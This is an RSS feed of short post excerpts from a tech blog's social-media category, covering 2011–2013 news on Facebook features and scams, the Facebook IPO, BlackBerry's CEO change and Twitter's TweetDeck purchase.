<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Social-Media on iCosmoGeek</title>
    <link>https://example.org/categories/social-media/</link>
    <description>Recent content in Social-Media on iCosmoGeek</description>
    <generator>Hugo -- 0.140.2</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 05 Nov 2013 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://example.org/categories/social-media/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>BlackBerry fires CEO Thorsten Heins, scraps buyout plan</title>
      <link>https://example.org/posts/2013-11-05-blackberry-fires-ceo-thorsten-heins-scraps-buyout-plan/</link>
      <pubDate>Tue, 05 Nov 2013 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2013-11-05-blackberry-fires-ceo-thorsten-heins-scraps-buyout-plan/</guid>
      <description>&lt;p&gt;In a bit of a surprise move, BlackBerry announced this morning that it has given up on its effort to sell itself to a large investor, and that it will be replacing Thorsten Heins with former Sybase chief John Chen as interim CEO.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://iCosmoGeek.com/wp-content/uploads/2013/11/blackberry-10-event-header.jpg&#34;&gt;&lt;img alt=&#34;blackberry&#34; loading=&#34;lazy&#34; src=&#34;https://example.org/posts/2013-11-05-blackberry-fires-ceo-thorsten-heins-scraps-buyout-plan/images/blackberry-10-event-header.jpg&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;From the &lt;a href=&#34;http://press.blackberry.com/financial/2013/blackberry-receives-investment-of-u-s---1-billion--from-fairfax-.html&#34;&gt;official press release&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;“BlackBerry (Nasdaq: BBRY; TSX: BB), a world leader in the mobile communications market, today announced that it has entered into an agreement pursuant to which Fairfax Financial Holdings Limited (“Fairfax”) and other institutional investors (collectively, the “Purchasers”) will invest in BlackBerry through a U.S. $1 billion private placement of convertible debentures.  Fairfax has agreed to acquire U.S.$250 million principal amount of the Debentures.  The transaction is expected to be completed within the next two weeks&amp;hellip;.&amp;quot;&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Weddings, Engagements Will Be Announced Like Birthdays On Facebook</title>
      <link>https://example.org/posts/2012-07-13-weddings-engagements-will-be-announced-like-birthdays-on-facebook/</link>
      <pubDate>Fri, 13 Jul 2012 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2012-07-13-weddings-engagements-will-be-announced-like-birthdays-on-facebook/</guid>
      <description>&lt;p&gt;Would it be nice to wish your friends on their weddings or engagements with just a single click, just like the current Birthday feature on Facebook? Now, the company released a new “Weddings and Celebrations” feature that will display special events, starting with weddings and engagements, along with friends’ birthdays. It works just like birthday feature which shows up in the top right side of page when you log in.&lt;/p&gt;</description>
    </item>
    <item>
      <title>You Can Now Edit A Comment On Facebook With All Viewable Version History</title>
      <link>https://example.org/posts/2012-06-22-you-can-now-edit-a-comment-with-all-viewable-version-history-on-facebook/</link>
      <pubDate>Fri, 22 Jun 2012 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2012-06-22-you-can-now-edit-a-comment-with-all-viewable-version-history-on-facebook/</guid>
      <description>&lt;p&gt;Facebook is rolling out an interesting new feature where it will allow you to edit your own comments with all viewable version history of it. If you made a mistake or want to make any changes to your comment on a post, you can now edit it instead of deleting and reposting a new comment.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://iCosmoGeek.com/wp-content/uploads/2012/06/Facebook-Comment.jpg&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://example.org/posts/2012-06-22-you-can-now-edit-a-comment-with-all-viewable-version-history-on-facebook/images/Facebook-Comment.jpg&#34; title=&#34;Facebook Comment&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;a href=&#34;http://www.flickr.com/photos/robatron3000/4008795125/sizes/l/in/photostream/&#34;&gt;Credit&lt;/a&gt;]&lt;/p&gt;
&lt;p&gt;When you edit a comment, you&amp;rsquo;ll see a note under your comment showing the time it was edited. Anyone who can see your comment can see this and click on the &lt;strong&gt;Edited&lt;/strong&gt; link (highlighted in yellow below) to see what was changed. Facebook tells &lt;a href=&#34;https://www.facebook.com/help/?faq=105443102880679&#34;&gt;you&lt;/a&gt; how to do that.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook IPO Debacle Explained in Simple English [A Wall Street Journal Video]</title>
      <link>https://example.org/posts/2012-06-13-facebook-ipo-debacle-explained-simple-english-a-wall-street-journal-video/</link>
      <pubDate>Wed, 13 Jun 2012 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2012-06-13-facebook-ipo-debacle-explained-simple-english-a-wall-street-journal-video/</guid>
      <description>&lt;p&gt;Facebook filed for an initial public offering (IPO) on February 1, 2012. This highly anticipated IPO was overwhelmed with problems costing thousands of dollars to many small investors and further damaging Wall Street&amp;rsquo;s reputation. The following video report from The Wall Street Journal explains Facebook IPO debacle in simple English.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://iCosmoGeek.com/wp-content/uploads/2012/06/Facebook-IPO.jpg&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://example.org/posts/2012-06-13-facebook-ipo-debacle-explained-simple-english-a-wall-street-journal-video/images/Facebook-IPO.jpg&#34; title=&#34;Facebook IPO&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The stock price was set at $38 each. Its estimated that retail investors may have lost approximately $630 million on Facebook stock since its debut. Trading in the stock, which began on May 18, was delayed that day due to technical problems with the NASDAQ exchange. The stock struggled to stay above the IPO price for most of the day, forcing underwriters to buy back shares to support the price.&lt;/p&gt;</description>
    </item>
    <item>
      <title>This Woman Got Over 1 Million Comments On Her One Facebook Post</title>
      <link>https://example.org/posts/2012-01-27-this-woman-got-over-1-million-comments-on-her-one-facebook-post/</link>
      <pubDate>Fri, 27 Jan 2012 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2012-01-27-this-woman-got-over-1-million-comments-on-her-one-facebook-post/</guid>
      <description>&lt;p&gt;This could be a record for the most comments on a single Facebook post! Until now, Matthews got around 1,001,291 responses to a single post. She and her 107 friends on Facebook set this new record.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/-arCAEPcMz7U/TyLRLy6FY7I/AAAAAAAAIUE/XCyV53HustU/s1600-h/image%25255B3%25255D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/-FkVFXR7FI-g/TyLRMWuM2gI/AAAAAAAAIUM/eNiciiuxXUQ/image_thumb%25255B1%25255D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This woman told &lt;a href=&#34;http://www.fox40.com/news/headlines/ktxl-woman-gets-over-a-million-comments-on-facebook-post-20120126,0,6356388.story&#34;&gt;Fox40&lt;/a&gt; that there are some wordy comments on the post, a lot of them consist of just the word ‘go’. If 107 of her friends participated in posting 1,001,291 comments – each person posted an average of 9357 times. The group submitted their post to the Guinness Book of World Records, but has yet to hear if they actually set the record.&lt;/p&gt;</description>
    </item>
    <item>
      <title>How to Make Extra Money Using Craigslist</title>
      <link>https://example.org/posts/2012-01-25-how-to-make-extra-money-using-craigslist/</link>
      <pubDate>Wed, 25 Jan 2012 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2012-01-25-how-to-make-extra-money-using-craigslist/</guid>
      <description>&lt;p&gt;If you’re looking to make some extra cash, you might want to try turning your efforts toward Craigslist’s local and free online classified ads. &lt;a href=&#34;http://craigslist.org/&#34;&gt;Craigslist&lt;/a&gt; has been around for a while, but it’s still a place that many people frequent. It’s a great place to meet people in your community for group activities or mutual interests, find or post a job, and buy or sell just about anything at all. If you use it correctly, you can find some great opportunities to earn some extra spending money. Start by signing up for a free account and finding your local page. There are Craigslist sites for hundreds of cities and regions across the country, so find the one or two closest to your location and get started.&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To Insert Your Profile Picture As Emoticon In Facebook Chat</title>
      <link>https://example.org/posts/2011-12-29-how-to-insert-your-profile-picture-as-emoticon-in-facebook-chat/</link>
      <pubDate>Thu, 29 Dec 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-12-29-how-to-insert-your-profile-picture-as-emoticon-in-facebook-chat/</guid>
      <description>&lt;p&gt;For all those Facebook chat fans, here is a cool trick to insert your profile picture as emoticon inside chat windows. In fact, this trick works with any of the profile pictures, Facebook pages. This means you can insert Mark Zuckerberg’s face or even Jessica Alba’s picture while chatting with your friends.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/-gOL13j5hZVE/TvwLR8qe5sI/AAAAAAAAIAo/3HUID0y_Jeg/s1600-h/image%25255B8%25255D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/-FemTtPVkSCo/TvwLSGDO_LI/AAAAAAAAIAw/JLRbdC2MBQI/image_thumb%25255B4%25255D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;As shown in the above picture (leave those red rectangles), you can insert profile pictures of Facebook users and also pages inside chat windows.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Zuckerberg’s Private Pics Revealed in Facebook Security Flaw</title>
      <link>https://example.org/posts/2011-12-06-zuckerbergs-private-pics-revealed-in-facebook-security-flaw/</link>
      <pubDate>Tue, 06 Dec 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-12-06-zuckerbergs-private-pics-revealed-in-facebook-security-flaw/</guid>
      <description>&lt;p&gt;A security flaw in Facebook has been discovered which may reveal your private photos. The world’s largest social networking website with an estimated 850 million users confirmed this bug and issued a statement that it has been fixed.&lt;/p&gt;
&lt;p&gt;The exploit allowed the hacker to dig into Mark Zuckerberg’s Facebook &lt;a href=&#34;https://www.facebook.com/zuck&#34;&gt;page&lt;/a&gt; inside photos section and revealed some private photos. Before you try this how exactly it works, Facebook might have already fixed this bug.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Zuckerberg deleted Facebook. And Then He Killed Himself. Parody Trailer [Video]</title>
      <link>https://example.org/posts/2011-11-24-zuckerberg-deleted-facebook-and-then-he-killed-himself-parody-trailer-video/</link>
      <pubDate>Thu, 24 Nov 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-11-24-zuckerberg-deleted-facebook-and-then-he-killed-himself-parody-trailer-video/</guid>
      <description>&lt;p&gt;What if Mark Zuckerberg deletes Facebook and kills himself? &lt;a href=&#34;http://www.nicepieceproductions.com/&#34;&gt;Nice Piece Productions&lt;/a&gt; have created hilarious parody trailer titled “&lt;strong&gt;The Social Network 2&lt;/strong&gt;”. The trailer points how our society and life panics down if Facebook disappears suddenly?&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.youtube.com/watch?v=95N3EV4jAoE&amp;amp;feature=player_embedded&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/-DeS0L4tLkrA/Ts6x9WDSz9I/AAAAAAAAHvc/pOgXQM8BMuY/video12ee27760c00%25255B10%25255D.jpg?imgmax=800&#34;&gt;&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>What Did Steve Jobs Say About Microsoft, Google, Facebook? [Video]</title>
      <link>https://example.org/posts/2011-10-24-what-did-steve-jobs-say-about-microsoft-google-facebook-video/</link>
      <pubDate>Mon, 24 Oct 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-10-24-what-did-steve-jobs-say-about-microsoft-google-facebook-video/</guid>
      <description>&lt;p&gt;&lt;strong&gt;“They just don’t get it”&lt;/strong&gt; – That’s how Steve Jobs described his digital rivals Microsoft and Google in an interview with his biographer Walter Isaacson. &lt;strong&gt;Steve Jobs: A Biography&lt;/strong&gt; which is released today already in the number one place in &lt;a href=&#34;http://www.amazon.com/Steve-Jobs-Walter-Isaacson/dp/1451648537/&#34;&gt;Amazon’s&lt;/a&gt; charts (in all three Biography &amp;amp; History, Business, Technology categories).&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/-eExHbjrLtUI/TqXaXKfh9RI/AAAAAAAAGCc/gcPUkVQ_p3o/s1600-h/image%25255B4%25255D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh5.ggpht.com/-a_G5j-GSUuc/TqXaXgyd8CI/AAAAAAAAGCk/C_bj7zYEC0I/image_thumb%25255B2%25255D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In CBSNews’ &lt;em&gt;&lt;a href=&#34;http://www.cbsnews.com/sections/60minutes/main3415.shtml&#34;&gt;60 Minutes&lt;/a&gt;&lt;/em&gt; interview with the author Walter Isaacson, he explains on what Steve Jobs told him before his death for the biography. The author conducted more than 40 taped interviews with Steve.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Want to Keep Your Job? 5 Facebook Statuses to Steer Clear of</title>
      <link>https://example.org/posts/2011-10-01-want-to-keep-your-job-5-facebook-statuses-to-steer-clear-of/</link>
      <pubDate>Sat, 01 Oct 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-10-01-want-to-keep-your-job-5-facebook-statuses-to-steer-clear-of/</guid>
      <description>&lt;p&gt;Sure, Facebook is a great tool to use when you are updating your family members, or keeping in touch with your friends. Or, as some students put it, “Facebook Stalk” their friends. It&amp;rsquo;s great to upload pictures, chat with longtime friends that life faraway, and write on people&amp;rsquo;s walls. Sometimes, going on Facebook is also a great break. It could be a great break from a long homework assignment, or it can also be a good break from your work. Let&amp;rsquo;s face it, people can&amp;rsquo;t work 8 long hours without some sort of break. Going on Facebook is considered an acceptable form of a break. It can break the monotony. However, there are also some things that need to be considered when you go on Facebook.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Facebook Music Is Launching Tomorrow. Listen With Your Friend.</title>
      <link>https://example.org/posts/2011-09-22-facebook-music-is-launching-tomorrow-listen-with-your-friend/</link>
      <pubDate>Thu, 22 Sep 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-09-22-facebook-music-is-launching-tomorrow-listen-with-your-friend/</guid>
      <description>&lt;p&gt;Facebook is going to unveil its next massive killer socialize feature – &lt;strong&gt;Music,&lt;/strong&gt; at its &lt;strong&gt;f8 Developers Conference&lt;/strong&gt; tomorrow (Thursday, September 22, 2011). This will allow users to listen to music right from your Facebook page.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/-Ga6UwdTcu34/TnqfOvD7j7I/AAAAAAAAFnY/nWxlZ0anUE4/s1600-h/image%25255B2%25255D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/-w4s17OrJj-g/TnqfPzowxpI/AAAAAAAAFnc/iFsqSmITv54/image_thumb.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It is rumored that this music service is set to launch with collaboration Spotify, MOG and Rdio. Meanwhile, Techcrunch &lt;a href=&#34;http://techcrunch.com/2011/09/21/facebook-music-listen-with-friends/&#34;&gt;spotted&lt;/a&gt; an interesting tweet from Facebook’s creative director Ji Lee:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;The “Listen with your friend” feature in ticker is blowing my mind. Listen to what your friends are listening. LIVE.&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To Get Rid of “Facebook T-Shirt” Spam</title>
      <link>https://example.org/posts/2011-09-09-how-to-get-rid-of-facebook-t-shirt-spam/</link>
      <pubDate>Fri, 09 Sep 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-09-09-how-to-get-rid-of-facebook-t-shirt-spam/</guid>
      <description>&lt;p&gt;Are you one of those poor Facebook users who ended up clicking the latest scam of a &lt;strong&gt;free Facebook T-shirt?&lt;/strong&gt; Well, if you’re still hoping that you’re going to receive a free Tee, good luck by the way! You won’t receive one.&lt;br&gt;
This latest scam pretends you to claim a free Facebook Tee with an attractive webpage celebrating the social giant’s 7th birthday and saying it has more than 1.9 million official Tees in stock.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Anonymous: We will Destroy Facebook on November 5</title>
      <link>https://example.org/posts/2011-08-15-anonymous-we-will-destroy-facebook-on-november-5/</link>
      <pubDate>Mon, 15 Aug 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-08-15-anonymous-we-will-destroy-facebook-on-november-5/</guid>
      <description>&lt;p&gt;Anonymous, the famous online hackers group has announced a very dangerous news to make a huge attack on the popular social networking site Facebook on November 5. This hacking group, Anonymous has been known for publishing these kind of threatening statements and successful.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;images/zrclip001n71837d5f.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;If Operation Facebook is real, it could mark a new phase for Anonymous, which in recent weeks has joined forces with the remnants of the more tightly knit hacker group LulzSec to target law enforcement agencies in an ongoing operation called Antisec. Antisec aka Anti Security is a movement of online hackers working to oppose the computer security industry.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google&#43; Introduced Games</title>
      <link>https://example.org/posts/2011-08-13-google-introduced-games/</link>
      <pubDate>Sat, 13 Aug 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-08-13-google-introduced-games/</guid>
      <description>&lt;p&gt;Sharing is about more than just conversations - it’s about shared experiences too. And now, the Facebook killer, &lt;a href=&#34;http://plus.google.com&#34;&gt;Google+&lt;/a&gt; introduced Games too.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/-ZeDKVngrXmg/Tka9HrwLzjI/AAAAAAAAFj8/xFx6JFoJ85c/s1600-h/image%25255B4%25255D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/-kbKoOxyXNY8/Tka9IKKIM1I/AAAAAAAAFkA/2dfnnjc65E8/image_thumb%25255B2%25255D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To begin with, you will now be able to play some of the popular games like Crime City, Dragon Age Legends, Zynga Poker, Angry Birds, Sudoku Puzzles, etc. You can share your latest high scores with your friends’ circles too.&lt;/p&gt;
&lt;p&gt;If you are a Game developer interested in building games for this project, navigate to &lt;a href=&#34;https://services.google.com/fb/forms/plusdevelopers/&#34; title=&#34;https://services.google.com/fb/forms/plusdevelopers/&#34;&gt;https://services.google.com/fb/forms/plusdevelopers/&lt;/a&gt; and proceed further steps.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Mark Zuckerberg’s Sister Randi Zuckerberg Quits Facebook [Resignation Letter]</title>
      <link>https://example.org/posts/2011-08-04-mark-zuckerbergs-sister-randi-zuckerberg-quits-facebook-resignation-letter/</link>
      <pubDate>Thu, 04 Aug 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-08-04-mark-zuckerbergs-sister-randi-zuckerberg-quits-facebook-resignation-letter/</guid>
      <description>&lt;p&gt;Randi Zuckerberg is leaving Facebook to start her own social media company called &lt;strong&gt;RtoZ&lt;/strong&gt; Media. Randi is the Director of marketing has been with Facebook since near the beginning of the company’s rise to power.&lt;/p&gt;
&lt;p&gt;She had gone on a maternity leave three months ago, and instead returning to the company , she submitted a letter of resignation.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/-wcjoic0ioDo/TjpGiF4XZVI/AAAAAAAAFjc/uZL3qaykmHo/s1600-h/image%25255B6%25255D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh5.ggpht.com/-h0MUyLOewuI/TjpGlnEU-kI/AAAAAAAAFjg/ysiXuvE72Xw/image_thumb%25255B2%25255D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Her resignation letter included a summary of achievements during her 6 years journey at Facebook -&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To Promote Your Facebook Page as Notifications</title>
      <link>https://example.org/posts/2011-07-19-how-to-promote-your-facebook-page-as-notifications/</link>
      <pubDate>Tue, 19 Jul 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-07-19-how-to-promote-your-facebook-page-as-notifications/</guid>
      <description>&lt;p&gt;If you have your personal &lt;a href=&#34;http://www.facebook.com/cosmoGeek&#34;&gt;Page&lt;/a&gt; in Facebook, you know that you are allowed to promote that page to your friends, through only recommendations. Recommendations are not that great in which your friend might miss it as it only triggers email and the actual button resides in a corner of the Facebook sidebar.&lt;/p&gt;
&lt;p&gt;Today, Facebook introduced new way to recommend your fan page to your friends so that they’ll appear as notifications and also email message depending on the user settings.&lt;/p&gt;</description>
    </item>
    <item>
      <title>How To Disable Facebook Auto Facial Recognition Feature</title>
      <link>https://example.org/posts/2011-06-08-how-to-disable-facebook-auto-facial-recognition-feature/</link>
      <pubDate>Wed, 08 Jun 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-06-08-how-to-disable-facebook-auto-facial-recognition-feature/</guid>
      <description>&lt;p&gt;Facebook introduced facial recognition feature few days ago which lets an option to tag a picture automatically. This automatic photo tagging feature might be good for some of you but it may get creeper nevertheless.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/-f-EUmZufFyQ/Te-CMyn8p_I/AAAAAAAACDs/dB688lE099o/s1600-h/image%25255B2%25255D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%25255B9%25255D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh3.ggpht.com/-QTc3Rvv7JcU/Te-CO4XwPwI/AAAAAAAACD4/uPpnK43QfjY/image_thumb%25255B2%25255D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Click ‘Edit Settings’ and change the option to ‘&lt;strong&gt;Disabled’&lt;/strong&gt; if you don’t want Facebook to work in that fashion&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This auto facial recognition feature basically uses a comparison of photos you&amp;rsquo;re tagged in to suggest that friends tag you in new photos.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google Rolls Out Controversial Social Search Feature</title>
      <link>https://example.org/posts/2011-05-19-google-rolls-out-controversial-social-search-feature/</link>
      <pubDate>Thu, 19 May 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-05-19-google-rolls-out-controversial-social-search-feature/</guid>
      <description>&lt;p&gt;Google announced on its official blog that it is rolling out &lt;em&gt;controversial&lt;/em&gt; Social Search feature in over next few days.&lt;/p&gt;
&lt;p&gt;This experimental feature which is launched in 2009 combines regular Google search results with publicly available data created by your friends’ social network activities.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TdUlMEtQhlI/AAAAAAAAB_8/gIeQex9-vzc/s1600-h/image%5B4%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TdUlNQaPgsI/AAAAAAAACAA/tbQUvdJk0gU/image_thumb%5B2%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For example, if you’re looking for information about low-light photography and your friend has written a blog post about it, that post may show up higher in your results with a clear annotation and picture of your friend.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Two Parents Name Their Child &amp;quot;Like&amp;quot; As In Facebook &amp;quot;Like&amp;quot;</title>
      <link>https://example.org/posts/2011-05-18-two-parents-name-their-child-like-as-in-facebook-like/</link>
      <pubDate>Wed, 18 May 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-05-18-two-parents-name-their-child-like-as-in-facebook-like/</guid>
      <description>&lt;p&gt;Have you ever imagined a baby girl’s name as &lt;em&gt;“&lt;strong&gt;Like”?&lt;/strong&gt;&lt;/em&gt;  Well, its real now! More recently, a family in Israel decided to name their child “&lt;strong&gt;Like&lt;/strong&gt;” after the Facebook button.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh3.ggpht.com/_40bmzDo_mBs/TdPmg4-QGLI/AAAAAAAAB_0/r-vKqN8__Xw/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TdPmhpxcKxI/AAAAAAAAB_4/4DS8wwN8DYA/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The social networking site Facebook provided the inspiration for the couple – Lior and Vardit Adler. She could be all cute and precious, but how idiotic is to name ‘&lt;strong&gt;Like’?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;They explain it differently -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;To me it is important to give my children names that are not used anywhere else, at least not in Israel. If once people gave Biblical names and that was the icon, then today this is one of the most famous icons in the world, he said, joking that the name could be seen as a modern version of the traditional Jewish name Ahuva, which means &amp;ldquo;beloved.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Do Not Click “First Exposure: Apple iPhone 5” Facebook Links</title>
      <link>https://example.org/posts/2011-05-14-do-not-click-first-exposure-apple-iphone-5-facebook-links/</link>
      <pubDate>Sat, 14 May 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-05-14-do-not-click-first-exposure-apple-iphone-5-facebook-links/</guid>
      <description>&lt;p&gt;Facebook is always in news for its &lt;a href=&#34;http://www.cosmogeek.info/2011/04/new-facebook-spam-americas-got-talent.html&#34;&gt;spams&lt;/a&gt;, &lt;a href=&#34;http://www.cosmogeek.info/2011/04/new-facebook-spam-americas-got-talent.html&#34;&gt;click hijacks&lt;/a&gt;, like hijacks. &lt;a href=&#34;http://www.cosmogeek.info/2011/03/hoax-facebook-will-not-use-your-photos.html&#34;&gt;rumours&lt;/a&gt;. cosmoGeek instantly alerted its users in the past to get rid from these accidental clicks.&lt;/p&gt;
&lt;p&gt;Now, a new scam is making the rounds, asking victims with promises of news about Apple’s iPhone 5.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh5.ggpht.com/_40bmzDo_mBs/Tc1AcDRfJtI/AAAAAAAAB-Y/i6rpgCsesrY/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;images/image%5B7%5D.png&#34; title=&#34;image&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/Tc1Ae9uveKI/AAAAAAAAB-k/9pBVIFajs0w/image_thumb%5B3%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This typical link clicking is known as ‘clickjacking’ and it is not as dangerous as a virus or scam, but still it acts on your behalf without your consent.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Symantec says Facebook May Have Leaked Your Personal Info</title>
      <link>https://example.org/posts/2011-05-11-symantec-says-facebook-may-have-leaked-your-personal-info/</link>
      <pubDate>Wed, 11 May 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-05-11-symantec-says-facebook-may-have-leaked-your-personal-info/</guid>
      <description>&lt;p&gt;After Sony PlayStation’s recent security breach (hackers managed to steal personal wealth information from its system), we now have Symantec reporting that Facebook might have accidentally leaked your personal information.&lt;/p&gt;
&lt;p&gt;This is a serious security issue where the world’s largest social networking platform should concern.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://lh4.ggpht.com/_40bmzDo_mBs/Tcqrmj43z3I/AAAAAAAAB-I/lQcZzfSZCdA/s1600-h/image%5B3%5D.png&#34;&gt;&lt;img alt=&#34;image&#34; loading=&#34;lazy&#34; src=&#34;http://lh6.ggpht.com/_40bmzDo_mBs/TcqrnntpjTI/AAAAAAAAB-M/qOUHGl62Hd0/image_thumb%5B1%5D.png?imgmax=800&#34; title=&#34;image&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;According to Symantec’s &lt;a href=&#34;http://www.symantec.com/connect/blogs/facebook-applications-accidentally-leaking-access-third-parties&#34;&gt;blog post&lt;/a&gt;, third parties, in particular advertisers, have accidentally had access to Facebook users’ accounts including profiles, photographs, chat, and also had the ability to post messages and mine personal information.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Twitter Acquired TweetDeck For Over $40 Million</title>
      <link>https://example.org/posts/2011-05-03-twitter-acquired-tweetdeck-for-over-40-million/</link>
      <pubDate>Tue, 03 May 2011 00:00:00 +0000</pubDate>
      <guid>https://example.org/posts/2011-05-03-twitter-acquired-tweetdeck-for-over-40-million/</guid>
      <description>&lt;p&gt;According to a report from TechCrunch, &lt;strong&gt;Twitter&lt;/strong&gt; has won the battle and acquired &lt;strong&gt;TweetDeck&lt;/strong&gt; for an approximate unconfirmed figure of over $40 million.&lt;/p&gt;
